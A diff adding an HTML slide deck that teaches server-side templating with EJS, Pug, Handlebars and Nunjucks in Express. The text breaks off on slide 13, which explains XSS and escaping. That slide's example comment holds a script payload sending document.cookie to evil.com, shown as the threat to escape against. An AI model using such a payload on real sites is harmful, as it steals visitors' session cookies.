@@ -1,0 +1,1289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Introduction to Server-Side Templating</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=DM+Sans:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/reveal.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/theme/black.min.css">
+  <style>
+    :root {
+      --amber:  #f5a623;
+      --green:  #4ecb8d;
+      --purple: #a78bfa;
+      --blue:   #60a5fa;
+      --red:    #f87171;
+      --bg:     #0a0a0f;
+      --bg2:    #10101a;
+      --bg3:    #181824;
+      --border: #2a2a3a;
+      --text:   #e8e8f0;
+      --muted:  #8888a8;
+    }
+
+    .reveal-viewport { background: var(--bg); }
+    .reveal .slides section { background: transparent; }
+
+    .reveal { font-family: 'DM Sans', sans-serif; color: var(--text); }
+    .reveal h1, .reveal h2, .reveal h3 { font-family: 'Playfair Display', serif; font-weight: 700; }
+    .reveal h1 { font-size: 1.6em; color: var(--amber); line-height: 1.1; }
+    .reveal h2 { font-size: 1.1em; color: var(--amber); margin-bottom: .2em; }
+    .reveal h3 { font-size: .78em; color: var(--green); margin-bottom: .15em; }
+    .reveal p  { font-size: .56em; line-height: 1.45; color: var(--text); }
+    .reveal li { font-size: .54em; line-height: 1.45; margin-bottom: .1em; }
+    .reveal code { font-family: 'JetBrains Mono', monospace; font-size: .72em; }
+    .reveal pre  { box-shadow: none; background: var(--bg3); border: 1px solid var(--border);
+                   border-radius: 6px; padding: .3em .5em; margin: .25em 0; }
+    .reveal pre code { font-size: .52em; line-height: 1.35; background: transparent; color: #cdd6f4; }
+
+    .slide-hdr {
+      display: flex; align-items: center; gap: .4em;
+      border-bottom: 1px solid var(--border);
+      padding-bottom: .2em; margin-bottom: .3em;
+    }
+    .slide-hdr .tag {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: .42em; font-weight: 500;
+      color: var(--bg); background: var(--amber);
+      padding: .1em .4em; border-radius: 3px;
+      letter-spacing: .04em;
+    }
+    .slide-hdr h2 { margin: 0; font-size: .95em; }
+
+    .cols   { display: grid; gap: .5em; }
+    .cols-2 { grid-template-columns: 1fr 1fr; }
+    .cols-3 { grid-template-columns: 1fr 1fr 1fr; }
+    .cols-6040 { grid-template-columns: 6fr 4fr; }
+    .cols-4060 { grid-template-columns: 4fr 6fr; }
+
+    .card {
+      background: var(--bg2); border: 1px solid var(--border);
+      border-radius: 6px; padding: .35em .6em;
+    }
+    .card.amber { border-left: 3px solid var(--amber); }
+    .card.green { border-left: 3px solid var(--green); }
+    .card.purple{ border-left: 3px solid var(--purple); }
+    .card.blue  { border-left: 3px solid var(--blue); }
+    .card.red   { border-left: 3px solid var(--red); }
+    .card h3 { font-size: .64em; margin: 0 0 .12em; }
+    .card p  { font-size: .52em; margin: 0; color: #b8b8d0; }
+    .card ul { margin: 0; padding-left: 1em; }
+    .card li { font-size: .52em; color: #b8b8d0; margin-bottom: .02em; }
+
+    .reveal table { width: 100%; border-collapse: collapse; font-size: .5em; }
+    .reveal table th { background: var(--bg3); color: var(--amber); font-weight: 600;
+                       padding: .2em .4em; border: 1px solid var(--border); text-align: left; }
+    .reveal table td { padding: .18em .4em; border: 1px solid var(--border); color: #ccc; }
+    .reveal table tr:nth-child(even) td { background: #0e0e18; }
+
+    .a  { color: var(--amber); font-weight: 600; }
+    .g  { color: var(--green); font-weight: 600; }
+    .p  { color: var(--purple); font-weight: 600; }
+    .b  { color: var(--blue); font-weight: 600; }
+    .r  { color: var(--red); font-weight: 600; }
+    .mono { font-family: 'JetBrains Mono', monospace; }
+
+    svg.diagram { display: block; margin: 0 auto; overflow: visible; }
+
+    .pill {
+      display: inline-block; font-family: 'JetBrains Mono', monospace;
+      font-size: .44em; padding: .08em .4em; border-radius: 99px;
+      border: 1px solid; margin: 0 .08em;
+    }
+    .pill.amber { color: var(--amber); border-color: var(--amber); }
+    .pill.green { color: var(--green); border-color: var(--green); }
+    .pill.purple{ color: var(--purple); border-color: var(--purple); }
+    .pill.blue  { color: var(--blue); border-color: var(--blue); }
+
+    .reveal .slide-footer { display: none; }
+    .title-slide h1 { font-size: 1.8em; }
+    .title-slide .subtitle {
+      font-size: .7em; color: var(--green); font-family: 'DM Sans', sans-serif;
+      font-weight: 300; letter-spacing: .04em; margin: .3em 0 .6em;
+    }
+    .title-slide .meta { font-size: .48em; color: var(--muted); font-family: 'JetBrains Mono', monospace; }
+
+    .reveal ul, .reveal ol { margin: .15em 0 .15em 1em; }
+    .reveal .slides > section { display: flex !important; flex-direction: column !important; overflow-y: auto !important; align-items: stretch !important; justify-content: flex-start !important; }
+  </style>
+</head>
+<body>
+  <div class="reveal">
+    <div class="slides">
+
+      <!-- ========== SLIDE 01 — TITLE ========== -->
+      <section class="title-slide" data-background-color="#0a0a0f">
+        <div style="text-align:left; max-width:820px; margin:0 auto; padding: 1em 0;">
+          <div style="font-family:'JetBrains Mono',monospace; font-size:.5em; color:var(--muted); margin-bottom:.4em; letter-spacing:.1em;">SERVER-SIDE RENDERING</div>
+          <h1>Introduction to Server-Side Templating</h1>
+          <div class="subtitle">Engines, Patterns &amp; Express Integration</div>
+          <div style="width:60px; height:3px; background:var(--amber); margin-bottom:1.4em;"></div>
+          <div class="meta">EJS &middot; Pug &middot; Handlebars &middot; Nunjucks &middot; Mustache &middot; Liquid</div>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 02 — AGENDA ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">02</span><h2>Agenda</h2></div>
+        <div class="cols cols-2">
+          <div class="card amber">
+            <h3>Foundations</h3>
+            <ul>
+              <li>What is server-side templating?</li>
+              <li>How templating engines work</li>
+              <li>The template engine landscape</li>
+            </ul>
+          </div>
+          <div class="card green">
+            <h3>Engine Deep-Dives</h3>
+            <ul>
+              <li>EJS &mdash; Embedded JavaScript</li>
+              <li>Pug &mdash; Indentation-based syntax</li>
+              <li>Handlebars &mdash; Logic-less templates</li>
+              <li>Nunjucks &mdash; Jinja2 for JavaScript</li>
+            </ul>
+          </div>
+          <div class="card purple">
+            <h3>Patterns &amp; Architecture</h3>
+            <ul>
+              <li>Template inheritance &amp; layouts</li>
+              <li>Passing data to templates</li>
+              <li>Partials &amp; includes</li>
+              <li>Security &mdash; XSS &amp; escaping</li>
+            </ul>
+          </div>
+          <div class="card blue">
+            <h3>Production Concerns</h3>
+            <ul>
+              <li>Performance &amp; caching</li>
+              <li>SSR vs CSR trade-offs</li>
+              <li>Hybrid approaches (HTMX, Islands)</li>
+              <li>Choosing an engine &amp; Express integration</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 03 — WHAT IS SERVER-SIDE TEMPLATING? ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">03</span><h2>What Is Server-Side Templating?</h2></div>
+        <div class="cols cols-6040">
+          <div>
+            <div class="card amber">
+              <h3>Core Concept</h3>
+              <p>The server combines a <span class="a">template</span> (HTML with placeholders) and <span class="g">data</span> (from a DB, API, or session) to produce a <span class="b">complete HTML document</span> before sending it to the client.</p>
+            </div>
+            <div class="card green" style="margin-top:.4em;">
+              <h3>SSR vs CSR</h3>
+              <table>
+                <tr><th></th><th>Server-Side Rendering</th><th>Client-Side Rendering</th></tr>
+                <tr><td><span class="a">HTML built</span></td><td>On the server, per request</td><td>In the browser via JS</td></tr>
+                <tr><td><span class="a">First paint</span></td><td>Immediate &mdash; complete HTML</td><td>Blank page until JS loads</td></tr>
+                <tr><td><span class="a">SEO</span></td><td>Crawlers get full content</td><td>Requires pre-rendering</td></tr>
+                <tr><td><span class="a">Interactivity</span></td><td>Full page reloads (unless enhanced)</td><td>Rich SPA experience</td></tr>
+              </table>
+            </div>
+          </div>
+          <div>
+            <div class="card blue">
+              <h3>Request Flow</h3>
+              <svg class="diagram" viewBox="0 0 260 340" width="260">
+                <rect x="30" y="10" width="200" height="36" rx="6" fill="#10101a" stroke="#f5a623" stroke-width="1.5"/>
+                <text x="130" y="33" text-anchor="middle" fill="#f5a623" font-size="13" font-family="JetBrains Mono">GET /users</text>
+                <line x1="130" y1="46" x2="130" y2="76" stroke="#4ecb8d" stroke-width="1.5" marker-end="url(#arr)"/>
+                <rect x="30" y="76" width="200" height="36" rx="6" fill="#10101a" stroke="#a78bfa" stroke-width="1.5"/>
+                <text x="130" y="99" text-anchor="middle" fill="#a78bfa" font-size="13" font-family="JetBrains Mono">Route Handler</text>
+                <line x1="130" y1="112" x2="130" y2="142" stroke="#4ecb8d" stroke-width="1.5" marker-end="url(#arr)"/>
+                <rect x="30" y="142" width="200" height="36" rx="6" fill="#10101a" stroke="#60a5fa" stroke-width="1.5"/>
+                <text x="130" y="165" text-anchor="middle" fill="#60a5fa" font-size="13" font-family="JetBrains Mono">Fetch Data</text>
+                <line x1="130" y1="178" x2="130" y2="208" stroke="#4ecb8d" stroke-width="1.5" marker-end="url(#arr)"/>
+                <rect x="30" y="208" width="200" height="36" rx="6" fill="#10101a" stroke="#f5a623" stroke-width="1.5"/>
+                <text x="130" y="231" text-anchor="middle" fill="#f5a623" font-size="13" font-family="JetBrains Mono">Template + Data</text>
+                <line x1="130" y1="244" x2="130" y2="274" stroke="#4ecb8d" stroke-width="1.5" marker-end="url(#arr)"/>
+                <rect x="30" y="274" width="200" height="36" rx="6" fill="#10101a" stroke="#4ecb8d" stroke-width="1.5"/>
+                <text x="130" y="297" text-anchor="middle" fill="#4ecb8d" font-size="13" font-family="JetBrains Mono">HTML Response</text>
+                <defs><marker id="arr" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M 0 0 L 10 5 L 0 10 z" fill="#4ecb8d"/></marker></defs>
+              </svg>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 04 — HOW TEMPLATING ENGINES WORK ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">04</span><h2>How Templating Engines Work</h2></div>
+        <div class="cols cols-3">
+          <div class="card amber">
+            <h3>1. Parse</h3>
+            <p>The engine reads the template source and tokenises it into an <span class="a">Abstract Syntax Tree</span> (AST). Static text nodes and dynamic expression nodes are separated.</p>
+            <pre><code class="language-text">TokenStream:
+  TEXT   "Hello, "
+  EXPR   user.name
+  TEXT   "!"</code></pre>
+          </div>
+          <div class="card green">
+            <h3>2. Compile</h3>
+            <p>The AST is compiled into an executable <span class="g">render function</span>. Many engines generate a plain JavaScript function that concatenates strings.</p>
+            <pre><code class="language-javascript">// Compiled output (simplified)
+function render(locals) {
+  let out = "Hello, ";
+  out += escape(locals.user.name);
+  out += "!";
+  return out;
+}</code></pre>
+          </div>
+          <div class="card purple">
+            <h3>3. Render</h3>
+            <p>The compiled function is invoked with a <span class="p">data context</span>. The result is a complete HTML string ready for <code>res.send()</code>.</p>
+            <pre><code class="language-javascript">const html = render({
+  user: { name: "Alice" }
+});
+// => "Hello, Alice!"
+res.send(html);</code></pre>
+          </div>
+        </div>
+        <div class="card blue" style="margin-top:.4em;">
+          <h3>Caching Layer</h3>
+          <p>Production engines cache the <span class="b">compiled function</span> so subsequent renders skip parsing and compilation entirely. Only the render step executes per request. This is why <code>app.set('view cache', true)</code> matters in Express production mode.</p>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 05 — THE TEMPLATE ENGINE LANDSCAPE ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">05</span><h2>The Template Engine Landscape</h2></div>
+        <table>
+          <tr>
+            <th>Engine</th>
+            <th>Syntax Style</th>
+            <th>Logic</th>
+            <th>Inheritance</th>
+            <th>Auto-Escape</th>
+            <th>npm Weekly</th>
+          </tr>
+          <tr>
+            <td><span class="a">EJS</span></td>
+            <td>Embedded JS <code>&lt;%= %&gt;</code></td>
+            <td>Full JS</td>
+            <td>Partials only</td>
+            <td><code>&lt;%= %&gt;</code> yes</td>
+            <td>~14M</td>
+          </tr>
+          <tr>
+            <td><span class="g">Pug</span></td>
+            <td>Indentation-based</td>
+            <td>Full JS</td>
+            <td>extends/block</td>
+            <td>Yes (default)</td>
+            <td>~5M</td>
+          </tr>
+          <tr>
+            <td><span class="p">Handlebars</span></td>
+            <td>Mustache <code>{{ }}</code></td>
+            <td>Helpers only</td>
+            <td>Partials + layouts</td>
+            <td>Yes (default)</td>
+            <td>~11M</td>
+          </tr>
+          <tr>
+            <td><span class="b">Nunjucks</span></td>
+            <td>Jinja2 <code>{{ }}/{% %}</code></td>
+            <td>Filters + macros</td>
+            <td>extends/block</td>
+            <td>Configurable</td>
+            <td>~1.5M</td>
+          </tr>
+          <tr>
+            <td><span class="r">Mustache</span></td>
+            <td>Logic-less <code>{{ }}</code></td>
+            <td>None</td>
+            <td>Partials only</td>
+            <td>Yes</td>
+            <td>~5M</td>
+          </tr>
+          <tr>
+            <td><span class="a">Liquid</span></td>
+            <td>Shopify <code>{{ }}/{% %}</code></td>
+            <td>Tags + filters</td>
+            <td>Layouts + sections</td>
+            <td>Yes</td>
+            <td>~1.2M</td>
+          </tr>
+        </table>
+        <div class="cols cols-2" style="margin-top:.35em;">
+          <div class="card green">
+            <h3>Key Insight</h3>
+            <p>All engines solve the same fundamental problem: merge data with markup. They differ on how much <span class="a">logic</span> they allow in templates and how they handle <span class="p">composition</span> (layouts, inheritance, partials).</p>
+          </div>
+          <div class="card purple">
+            <h3>Choosing Criteria</h3>
+            <p>Consider: syntax familiarity, security defaults, Express integration quality, community/ecosystem, performance characteristics, and whether you need logic-less enforcement.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 06 — EJS ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">06</span><h2>EJS &mdash; Embedded JavaScript</h2></div>
+        <div class="cols cols-6040">
+          <div>
+            <div class="card amber">
+              <h3>Tag Reference</h3>
+              <table>
+                <tr><th>Tag</th><th>Purpose</th></tr>
+                <tr><td><code>&lt;%= expr %&gt;</code></td><td>Output with HTML escaping</td></tr>
+                <tr><td><code>&lt;%- expr %&gt;</code></td><td>Output <span class="r">unescaped</span> (raw HTML)</td></tr>
+                <tr><td><code>&lt;% code %&gt;</code></td><td>Execute JS (no output)</td></tr>
+                <tr><td><code>&lt;%# comment %&gt;</code></td><td>Comment (stripped from output)</td></tr>
+                <tr><td><code>&lt;%- include('path') %&gt;</code></td><td>Include a partial</td></tr>
+              </table>
+            </div>
+            <div class="card green" style="margin-top:.35em;">
+              <h3>Why EJS?</h3>
+              <ul>
+                <li>Zero new syntax &mdash; it's just JavaScript</li>
+                <li>Lowest learning curve for JS developers</li>
+                <li>Excellent Express integration out of the box</li>
+                <li>High npm download count = large ecosystem</li>
+              </ul>
+            </div>
+          </div>
+          <div>
+            <div class="card blue">
+              <h3>Example: User List</h3>
+              <pre><code class="language-html">&lt;!-- views/users.ejs --&gt;
+&lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt;
+
+&lt;% if (users.length) { %&gt;
+  &lt;ul&gt;
+    &lt;% users.forEach(user =&gt; { %&gt;
+      &lt;li&gt;
+        &lt;strong&gt;&lt;%= user.name %&gt;&lt;/strong&gt;
+        &lt;span&gt;&lt;%= user.email %&gt;&lt;/span&gt;
+      &lt;/li&gt;
+    &lt;% }) %&gt;
+  &lt;/ul&gt;
+&lt;% } else { %&gt;
+  &lt;p&gt;No users found.&lt;/p&gt;
+&lt;% } %&gt;</code></pre>
+            </div>
+            <div class="card purple" style="margin-top:.35em;">
+              <h3>Express Setup</h3>
+              <pre><code class="language-javascript">app.set('view engine', 'ejs');
+app.set('views', './views');
+
+app.get('/users', async (req, res) =&gt; {
+  const users = await User.find();
+  res.render('users', {
+    title: 'All Users',
+    users
+  });
+});</code></pre>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 07 — PUG ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">07</span><h2>Pug &mdash; Indentation-Based Syntax</h2></div>
+        <div class="cols cols-6040">
+          <div>
+            <div class="card amber">
+              <h3>Syntax Fundamentals</h3>
+              <pre><code class="language-pug">//- views/users.pug
+extends layout
+
+block content
+  h1= title
+
+  if users.length
+    ul
+      each user in users
+        li
+          strong= user.name
+          span= user.email
+  else
+    p No users found.</code></pre>
+            </div>
+            <div class="card green" style="margin-top:.35em;">
+              <h3>Mixins &mdash; Reusable Components</h3>
+              <pre><code class="language-pug">mixin userCard(user)
+  .card
+    h3= user.name
+    p= user.bio
+    a(href=`/users/${user.id}`) View Profile
+
+//- Usage
+each user in users
+  +userCard(user)</code></pre>
+            </div>
+          </div>
+          <div>
+            <div class="card purple">
+              <h3>Template Inheritance</h3>
+              <pre><code class="language-pug">//- views/layout.pug
+doctype html
+html(lang="en")
+  head
+    meta(charset="UTF-8")
+    title= title
+    link(rel="stylesheet" href="/css/app.css")
+  body
+    include partials/nav
+    main.container
+      block content
+    include partials/footer</code></pre>
+            </div>
+            <div class="card blue" style="margin-top:.35em;">
+              <h3>Key Features</h3>
+              <ul>
+                <li><span class="a">No closing tags</span> &mdash; indentation defines nesting</li>
+                <li><span class="g">Auto-escapes</span> by default; use <code>!=</code> for raw</li>
+                <li><span class="p">Mixins</span> act like template-level functions</li>
+                <li><span class="b">Filters</span> for inline Markdown, CoffeeScript, etc.</li>
+                <li>Compiles to highly optimised JS functions</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 08 — HANDLEBARS ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">08</span><h2>Handlebars &mdash; Logic-Less Templates</h2></div>
+        <div class="cols cols-2">
+          <div>
+            <div class="card amber">
+              <h3>Expressions &amp; Helpers</h3>
+              <pre><code class="language-handlebars">&lt;!-- views/users.hbs --&gt;
+&lt;h1&gt;{{title}}&lt;/h1&gt;
+
+{{#if users.length}}
+  &lt;ul&gt;
+    {{#each users}}
+      &lt;li&gt;
+        &lt;strong&gt;{{this.name}}&lt;/strong&gt;
+        &lt;span&gt;{{this.email}}&lt;/span&gt;
+        &lt;em&gt;Joined {{formatDate this.createdAt}}&lt;/em&gt;
+      &lt;/li&gt;
+    {{/each}}
+  &lt;/ul&gt;
+{{else}}
+  &lt;p&gt;No users found.&lt;/p&gt;
+{{/if}}</code></pre>
+            </div>
+            <div class="card green" style="margin-top:.35em;">
+              <h3>Custom Helpers</h3>
+              <pre><code class="language-javascript">const hbs = require('hbs');
+
+hbs.registerHelper('formatDate', (date) =&gt; {
+  return new Intl.DateTimeFormat('en-GB', {
+    day: 'numeric', month: 'short', year: 'numeric'
+  }).format(new Date(date));
+});
+
+hbs.registerHelper('eq', (a, b) =&gt; a === b);
+hbs.registerHelper('gt', (a, b) =&gt; a &gt; b);</code></pre>
+            </div>
+          </div>
+          <div>
+            <div class="card purple">
+              <h3>Partials</h3>
+              <pre><code class="language-handlebars">&lt;!-- views/partials/userCard.hbs --&gt;
+&lt;div class="card"&gt;
+  &lt;h3&gt;{{name}}&lt;/h3&gt;
+  &lt;p&gt;{{bio}}&lt;/p&gt;
+  &lt;a href="/users/{{id}}"&gt;Profile&lt;/a&gt;
+&lt;/div&gt;
+
+&lt;!-- Usage --&gt;
+{{#each users}}
+  {{&gt; userCard this}}
+{{/each}}</code></pre>
+            </div>
+            <div class="card blue" style="margin-top:.35em;">
+              <h3>Philosophy: Logic-Less</h3>
+              <ul>
+                <li>Templates cannot execute arbitrary JavaScript</li>
+                <li>Logic is constrained to <span class="a">built-in block helpers</span>: <code>if</code>, <code>each</code>, <code>unless</code>, <code>with</code></li>
+                <li>Custom logic goes into <span class="g">registered helpers</span></li>
+                <li>Forces clean <span class="p">separation of concerns</span></li>
+                <li>Safer by default &mdash; templates can't mutate state</li>
+                <li>Precompilable to JS for client-side use</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 09 — NUNJUCKS ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">09</span><h2>Nunjucks &mdash; Jinja2 for JavaScript</h2></div>
+        <div class="cols cols-2">
+          <div>
+            <div class="card amber">
+              <h3>Template Syntax</h3>
+              <pre><code class="language-twig">{# views/users.njk #}
+{% extends "layout.njk" %}
+
+{% block content %}
+  &lt;h1&gt;{{ title }}&lt;/h1&gt;
+
+  {% if users | length %}
+    &lt;ul&gt;
+    {% for user in users %}
+      &lt;li&gt;
+        &lt;strong&gt;{{ user.name }}&lt;/strong&gt;
+        {{ user.email }}
+        {{ user.createdAt | date("d MMM yyyy") }}
+      &lt;/li&gt;
+    {% endfor %}
+    &lt;/ul&gt;
+  {% else %}
+    &lt;p&gt;No users found.&lt;/p&gt;
+  {% endif %}
+{% endblock %}</code></pre>
+            </div>
+            <div class="card green" style="margin-top:.35em;">
+              <h3>Filters</h3>
+              <pre><code class="language-twig">{{ name | capitalize }}
+{{ price | round(2) }}
+{{ items | join(", ") }}
+{{ html | safe }}
+{{ text | truncate(100) }}
+{{ data | dump | safe }}</code></pre>
+            </div>
+          </div>
+          <div>
+            <div class="card purple">
+              <h3>Macros &mdash; Template Functions</h3>
+              <pre><code class="language-twig">{# macros/forms.njk #}
+{% macro field(name, label, type="text", val="") %}
+  &lt;div class="form-group"&gt;
+    &lt;label for="{{ name }}"&gt;{{ label }}&lt;/label&gt;
+    &lt;input type="{{ type }}"
+           id="{{ name }}"
+           name="{{ name }}"
+           value="{{ val }}"&gt;
+  &lt;/div&gt;
+{% endmacro %}
+
+{# Usage #}
+{% from "macros/forms.njk" import field %}
+{{ field("email", "Email Address", "email") }}
+{{ field("password", "Password", "password") }}</code></pre>
+            </div>
+            <div class="card blue" style="margin-top:.35em;">
+              <h3>Why Nunjucks?</h3>
+              <ul>
+                <li>Familiar to Python/Jinja2 developers</li>
+                <li><span class="a">Macros</span> provide component-like reuse</li>
+                <li><span class="g">Template inheritance</span> is first-class</li>
+                <li>Rich <span class="p">filter</span> pipeline for data transformation</li>
+                <li>Async support for <code>await</code> in templates</li>
+                <li>Maintained by Mozilla</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 10 — TEMPLATE INHERITANCE & LAYOUTS ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">10</span><h2>Template Inheritance &amp; Layouts</h2></div>
+        <div class="cols cols-2">
+          <div>
+            <div class="card amber">
+              <h3>Base Layout (Nunjucks)</h3>
+              <pre><code class="language-twig">{# views/base.njk #}
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+  &lt;meta charset="UTF-8"&gt;
+  &lt;title&gt;{% block title %}My App{% endblock %}&lt;/title&gt;
+  &lt;link rel="stylesheet" href="/css/app.css"&gt;
+  {% block head %}{% endblock %}
+&lt;/head&gt;
+&lt;body&gt;
+  {% include "partials/nav.njk" %}
+  &lt;main class="container"&gt;
+    {% block content %}{% endblock %}
+  &lt;/main&gt;
+  {% include "partials/footer.njk" %}
+  {% block scripts %}{% endblock %}
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            </div>
+          </div>
+          <div>
+            <div class="card green">
+              <h3>Child Template</h3>
+              <pre><code class="language-twig">{# views/dashboard.njk #}
+{% extends "base.njk" %}
+
+{% block title %}Dashboard{% endblock %}
+
+{% block head %}
+  &lt;link rel="stylesheet" href="/css/charts.css"&gt;
+{% endblock %}
+
+{% block content %}
+  &lt;h1&gt;Dashboard&lt;/h1&gt;
+  &lt;div class="stats"&gt;{{ stats | dump | safe }}&lt;/div&gt;
+{% endblock %}
+
+{% block scripts %}
+  &lt;script src="/js/charts.js"&gt;&lt;/script&gt;
+{% endblock %}</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="card purple" style="margin-top:.35em;">
+          <h3>Pattern Comparison</h3>
+          <table>
+            <tr><th>Pattern</th><th>EJS</th><th>Pug</th><th>Handlebars</th><th>Nunjucks</th></tr>
+            <tr><td>Inheritance</td><td>N/A (use partials)</td><td><code>extends</code> / <code>block</code></td><td><code>express-handlebars</code> layouts</td><td><code>extends</code> / <code>block</code></td></tr>
+            <tr><td>Partials</td><td><code>include('file')</code></td><td><code>include file</code></td><td><code>{{&gt; partial}}</code></td><td><code>{% include "file" %}</code></td></tr>
+            <tr><td>Blocks</td><td>N/A</td><td><code>block name</code></td><td>N/A (helper-based)</td><td><code>{% block name %}</code></td></tr>
+          </table>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 11 — PASSING DATA TO TEMPLATES ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">11</span><h2>Passing Data to Templates</h2></div>
+        <div class="cols cols-2">
+          <div>
+            <div class="card amber">
+              <h3>res.render() &mdash; The Core API</h3>
+              <pre><code class="language-javascript">// Signature
+res.render(view, [locals], [callback]);
+
+// Basic usage
+app.get('/profile', async (req, res) =&gt; {
+  const user = await User.findById(req.params.id);
+  res.render('profile', {
+    user,
+    title: `${user.name}'s Profile`,
+    isOwner: req.user?.id === user.id
+  });
+});</code></pre>
+            </div>
+            <div class="card green" style="margin-top:.35em;">
+              <h3>app.locals &mdash; Global Data</h3>
+              <pre><code class="language-javascript">// Available in EVERY template render
+app.locals.siteName = 'MyApp';
+app.locals.year = new Date().getFullYear();
+app.locals.formatCurrency = (n) =&gt;
+  new Intl.NumberFormat('en-GB', {
+    style: 'currency', currency: 'GBP'
+  }).format(n);</code></pre>
+            </div>
+          </div>
+          <div>
+            <div class="card purple">
+              <h3>res.locals &mdash; Per-Request Data</h3>
+              <pre><code class="language-javascript">// Middleware sets per-request locals
+app.use((req, res, next) =&gt; {
+  res.locals.currentUser = req.user || null;
+  res.locals.csrfToken = req.csrfToken?.();
+  res.locals.flash = req.flash?.() || {};
+  next();
+});
+
+// Available in templates without explicit passing
+// &lt;%= currentUser.name %&gt;
+// &lt;input type="hidden" value="&lt;%= csrfToken %&gt;"&gt;</code></pre>
+            </div>
+            <div class="card blue" style="margin-top:.35em;">
+              <h3>Data Resolution Order</h3>
+              <ul>
+                <li><span class="a">res.render() locals</span> &mdash; highest priority</li>
+                <li><span class="g">res.locals</span> &mdash; per-request (middleware)</li>
+                <li><span class="p">app.locals</span> &mdash; application-wide globals</li>
+              </ul>
+              <p>Later values do <span class="r">not</span> override earlier ones. The object passed to <code>res.render()</code> takes precedence over <code>res.locals</code>, which takes precedence over <code>app.locals</code>.</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 12 — PARTIALS & INCLUDES ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">12</span><h2>Partials &amp; Includes</h2></div>
+        <div class="cols cols-3">
+          <div class="card amber">
+            <h3>EJS Partials</h3>
+            <pre><code class="language-html">&lt;!-- views/partials/nav.ejs --&gt;
+&lt;nav class="navbar"&gt;
+  &lt;a href="/"&gt;&lt;%= siteName %&gt;&lt;/a&gt;
+  &lt;% if (currentUser) { %&gt;
+    &lt;span&gt;&lt;%= currentUser.name %&gt;&lt;/span&gt;
+    &lt;a href="/logout"&gt;Logout&lt;/a&gt;
+  &lt;% } else { %&gt;
+    &lt;a href="/login"&gt;Login&lt;/a&gt;
+  &lt;% } %&gt;
+&lt;/nav&gt;
+
+&lt;!-- Include in layout --&gt;
+&lt;%- include('partials/nav') %&gt;</code></pre>
+          </div>
+          <div class="card green">
+            <h3>Pug Includes</h3>
+            <pre><code class="language-pug">//- views/partials/nav.pug
+nav.navbar
+  a(href="/")= siteName
+  if currentUser
+    span= currentUser.name
+    a(href="/logout") Logout
+  else
+    a(href="/login") Login
+
+//- Include in layout
+include partials/nav</code></pre>
+          </div>
+          <div class="card purple">
+            <h3>Handlebars Partials</h3>
+            <pre><code class="language-handlebars">&lt;!-- views/partials/nav.hbs --&gt;
+&lt;nav class="navbar"&gt;
+  &lt;a href="/"&gt;{{siteName}}&lt;/a&gt;
+  {{#if currentUser}}
+    &lt;span&gt;{{currentUser.name}}&lt;/span&gt;
+    &lt;a href="/logout"&gt;Logout&lt;/a&gt;
+  {{else}}
+    &lt;a href="/login"&gt;Login&lt;/a&gt;
+  {{/if}}
+&lt;/nav&gt;
+
+&lt;!-- Include in layout --&gt;
+{{&gt; nav}}</code></pre>
+          </div>
+        </div>
+        <div class="card blue" style="margin-top:.35em;">
+          <h3>Directory Structure Convention</h3>
+          <pre><code class="language-text">views/
+├── layouts/
+│   └── main.ejs          # Base layout (HTML shell)
+├── partials/
+│   ├── nav.ejs            # Navigation bar
+│   ├── footer.ejs         # Footer
+│   ├── flash.ejs          # Flash messages
+│   └── head.ejs           # &lt;head&gt; meta/links
+├── users/
+│   ├── index.ejs          # User list page
+│   ├── show.ejs           # Single user page
+│   └── edit.ejs           # Edit user form
+└── errors/
+    ├── 404.ejs
+    └── 500.ejs</code></pre>
+        </div>
+      </section>
+
+      <!-- ========== SLIDE 13 — SECURITY: XSS & ESCAPING ========== -->
+      <section>
+        <div class="slide-hdr"><span class="tag">13</span><h2>Security &mdash; XSS &amp; Escaping</h2></div>
+        <div class="cols cols-6040">
+          <div>
+            <div class="card red">
+              <h3>The Threat: Cross-Site Scripting (XSS)</h3>
+              <pre><code class="language-javascript">// User input stored in DB:
+const comment = {
+  text: '&lt;script&gt;fetch("https://evil.com/steal?c="' +
+        '+document.cookie)&lt;/script&gt;'
+};
+
+// UNSAFE: raw output
+res.render('comment', { comment });
+// Template: &lt;%- comment.text %&gt;
